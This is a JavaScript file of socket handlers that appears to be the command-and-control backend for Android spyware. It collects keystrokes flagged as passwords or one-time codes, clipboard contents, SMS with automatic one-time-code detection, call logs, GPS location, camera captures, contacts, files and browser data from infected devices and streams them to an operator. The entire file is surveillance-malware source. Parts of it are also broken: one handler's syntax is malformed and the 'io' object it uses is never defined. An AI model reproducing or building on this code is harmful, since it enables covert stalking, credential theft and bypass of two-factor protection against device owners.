const Device = require('../models/Device');
const Keylog = require('../models/Keylog');
const Screenshot = require('../models/Screenshot');
const SMS = require('../models/SMS');
const CallLog = require('../models/CallLog');
const { decrypt } = require('../utils/crypto');

const deviceHandlers = {
  // Device registration
  async 'device:register' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, deviceName, platform, model, osVersion, ipAddress, country, isRooted, encryptionKey } = decryptedData;

      const device = await Device.findOneAndUpdate(
        { sessionId },
        {
          sessionId,
          deviceName,
          platform,
          model,
          osVersion,
          ipAddress,
          country,
          isRooted,
          encryptionKey,
          isOnline: true,
          lastSeen: Date.now(),
        },
        { upsert: true, new: true }
      );

      socket.join(`device:${sessionId}`);
      
      io.emit('device:registered', {
        sessionId: device.sessionId,
        deviceName: device.deviceName,
        platform: device.platform,
        model: device.model,
        isOnline: true,
      });

      socket.emit('device:connected', { success: true, sessionId });
    } catch (error) {
      console.error('Device registration error:', error);
      socket.emit('device:connected', { success: false, error: error.message });
    }
  },

  // Heartbeat
  'device:heartbeat' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, batteryLevel, isCharging, latitude, longitude } = decryptedData;

      Device.findOneAndUpdate(
        { sessionId },
        {
          batteryLevel,
          isCharging,
          latitude,
          longitude,
          isOnline: true,
          lastSeen: Date.now(),
        }
      );

      io.emit('device:heartbeat', {
        sessionId,
        batteryLevel,
        isCharging,
        latitude,
        longitude,
      });
    } catch (error) {
      console.error('Heartbeat error:', error);
    }
  },

  // Keylogger data
  async 'keylogger:data' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, keystroke, appPackage, isPassword, isOtp, clipboard } = decryptedData;

      const keylog = new Keylog({
        sessionId,
        keystroke,
        appPackage,
        isPassword,
        isOtp,
        clipboard,
      });

      await keylog.save();

      io.to(`device:${sessionId}`).emit('keylogger:received', {
        keystroke,
        timestamp: new Date().toISOString(),
        appPackage,
        isPassword,
        isOtp,
      });
    } catch (error) {
      console.error('Keylogger error:', error);
    }
  },

  // Screenshot upload
  async 'screenshot:upload' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, imageUrl, camera, quality } = decryptedData;

      const screenshot = new Screenshot({
        sessionId,
        imageUrl,
        camera,
        quality,
      });

      await screenshot.save();

      io.to(`device:${sessionId}`).emit('screenshot:received', {
        imageUrl,
        camera,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Screenshot error:', error);
    }
  },

  // SMS data
  async 'sms:data' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, smsList } = decryptedData;

      for (const sms of smsList) {
        const smsDoc = new SMS({
          sessionId,
          phoneNumber: sms.phoneNumber,
          message: sms.message,
          timestamp: sms.timestamp,
          type: sms.type,
          isOtp: sms.isOtp || /[\d]{4,6}/.test(sms.message),
        });
        await smsDoc.save();
      }

      io.to(`device:${sessionId}`).emit('sms:received', {
        count: smsList.length,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('SMS error:', error);
    }
  },

  // Call log data
  async 'calllog:data' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, callLogs } = decryptedData;

      for (const call of callLogs) {
        const callDoc = new CallLog({
          sessionId,
          phoneNumber: call.phoneNumber,
          callType: call.callType,
          duration: call.duration,
          timestamp: call.timestamp,
        });
        await callDoc.save();
      }

      io.to(`device:${sessionId}`).emit('calllog:received', {
        count: callLogs.length,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Call log error:', error);
    }
  },

  // GPS location update
  'location:update' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, latitude, longitude, speed, altitude } = decryptedData;

      Device.findOneAndUpdate(
        { sessionId },
        {
          latitude,
          longitude,
          lastSeen: Date.now(),
        }
      );

      io.emit('location:update', {
        sessionId,
        latitude,
        longitude,
        speed,
        altitude,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Location error:', error);
    }
  },

  // File manager data
  'file:list' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, path, files } = decryptedData;

      io.to(`admin:${sessionId}`).emit('file:list', {
        sessionId,
        path,
        files,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('File list error:', error);
    }
  },

  // Contacts data
  'contacts:list' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, contacts } = decryptedData;

      io.to(`admin:${sessionId}`).emit('contacts:received', {
        sessionId,
        count: contacts.length,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Contacts error:', error);
    }
  },

  // Apps list
  'apps:list' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, apps } = decryptedData;

      io.to(`admin:${sessionId}`).emit('apps:received', {
        sessionId,
        count: apps.length,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Apps error:', error);
    }
  },

  // Browser data
  'browser:data' (data, socket) {
    try {
      const decryptedData = decrypt(data);
      const { sessionId, browserData } = decryptedData;

      io.to(`admin:${sessionId}`).emit('browser:received', {
        sessionId,
        browserData,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Browser error:', error);
    }
  },

  // Device disconnect
  'device:disconnect' (async (data, socket) => {
    try {
      const decryptedData = decrypt(data);
      const { sessionId } = decryptedData;

      await Device.findOneAndUpdate(
        { sessionId },
        {
          isOnline: false,
          lastSeen: Date.now(),
        }
      );

      io.emit('device:disconnected', {
        sessionId,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error('Disconnect error:', error);
    }
  }),
};

module.exports = deviceHandlers;